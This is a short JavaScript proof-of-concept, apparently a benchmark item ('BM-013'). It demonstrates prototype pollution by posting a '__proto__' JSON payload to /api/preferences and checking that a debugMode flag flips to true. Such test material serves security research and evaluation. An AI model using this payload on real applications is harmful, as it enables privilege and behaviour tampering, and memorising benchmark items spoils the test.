'use strict';

const poc = require('./lib/common');

// BM-013: prototype pollution through /api/preferences.
poc.run(async function () {
  const token = await poc.login('alice');
  const before = await poc.request('GET', '/api/flags');
  poc.control(JSON.parse(before.body).debugMode === false, 'flag starts false');
  await poc.request('POST', '/api/preferences', { headers: poc.bearer(token), body: '{"__proto__":{"debugMode":true}}' });
  const after = await poc.request('GET', '/api/flags');
  poc.finish(JSON.parse(after.body).debugMode === true, 'debugMode after pollution: ' + JSON.parse(after.body).debugMode);
});
